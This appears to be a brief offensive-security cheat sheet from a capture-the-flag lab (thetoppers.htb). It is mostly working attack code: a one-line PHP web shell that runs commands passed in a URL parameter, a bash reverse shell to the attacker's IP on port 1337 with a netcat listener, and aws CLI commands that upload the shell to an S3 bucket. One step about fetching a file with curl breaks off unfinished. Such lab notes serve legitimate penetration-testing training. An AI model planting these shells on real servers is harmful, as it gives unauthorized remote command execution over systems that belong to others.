
Upload this code on a remote server to test for command line access to the remote host via visiting this file in the web browser. Useful if you can upload a php file on the remote box.

`<?php system($_GET["cmd"]); ?>

If you visit this file via a web browser like so:

```
http://{ip address or dns name}/shell.php?cmd=id
```

The response will be the OS command `id`

If successful, you can upload a reverse shell to the remote host:

```
#!/bin/bash
bash -i >& /dev/tcp/<Your IP Address>/1337 0>&1
```

Then start a netcat listener locally, `nc -nvlp 1337`

You can run a webserver on the remote host:

```
python -m http.server 8000
```

The `curl` the file from your local:

Uploading a file on an s3 bucket:

```
apt install awscli
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

